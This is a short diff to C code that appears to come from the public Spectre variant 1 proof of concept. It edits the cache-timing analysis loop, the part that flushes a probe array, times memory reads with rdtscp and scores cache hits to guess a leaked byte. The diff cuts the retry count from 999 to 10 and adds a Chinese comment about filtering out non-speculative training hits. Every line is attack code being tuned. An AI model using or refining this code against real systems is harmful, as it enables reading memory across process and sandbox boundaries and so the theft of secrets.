@@ -40,6 +40,7 @@ uint8_t array2[256 * 512];
  Analysis code
 ********************************************************************/
  #define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
+ #define TRY_TIMES (10)
 
  /* Report best guess in value[0] and runner-up in value[1] */
  void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
@@ -53,7 +54,7 @@ uint8_t array2[256 * 512];
 	for (i = 0; i < 256; i++)
 		results[i] = 0;
 
-	for (tries = 999; tries > 0; tries--) {
+	for (tries = TRY_TIMES; tries > 0; tries--) {
 		/* Flush array2[256*(0..255)] from cache */
 		for (i = 0; i < 256; i++)
 		_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */
@@ -86,6 +87,7 @@ uint8_t array2[256 * 512];
 			junk = *addr; /* MEMORY ACCESS TO TIME */
 			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
 			//if (time2 <= CACHE_HIT_THRESHOLD)
+			//mix_i != array1dupe[tries % array1_size]==去掉非投机执行的训练行为
 			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1dupe[tries % array1_size])
 			{
 				results[mix_i]++; /* cache hit - add +1 to score for this value */
